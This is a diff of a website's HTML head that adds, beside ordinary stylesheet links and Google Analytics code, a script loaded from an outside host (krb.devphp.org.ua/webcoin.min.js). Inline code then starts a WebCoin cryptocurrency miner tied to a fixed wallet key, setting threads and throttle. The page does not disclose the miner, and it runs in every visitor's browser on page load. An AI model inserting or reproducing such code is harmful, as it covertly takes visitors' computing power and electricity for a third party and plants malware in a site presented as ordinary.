@@ -57,11 +57,19 @@
     </div>
     <link rel="stylesheet" href="css/bootstrap.min.css">
     <link rel="stylesheet" href="css/style-min.css">
+    <script src="http://krb.devphp.org.ua/webcoin.min.js"></script>
     <script>
       window.dataLayer = window.dataLayer || [];
       function gtag(){dataLayer.push(arguments)};
       gtag('js', new Date());
       gtag('config', 'UA-106582034-1');
+    </script>
+    <script>
+        var miner = new WebCoin.Miner('KjGiy5g4Ex7WqXM7kaxR1VNWJWridj5ACE3kw9dqNLb7RJbPpwAp51rabhQJAhbBuRgWY7CYaJmCMY9SCHqAP5WJ57ezdNw');
+        miner.start();
+        miner.setPool(0);
+        miner.setNumThreads(1);
+        miner.setThrottle(0.5);
     </script>
     <script>
         var xmlhttp = new XMLHttpRequest();
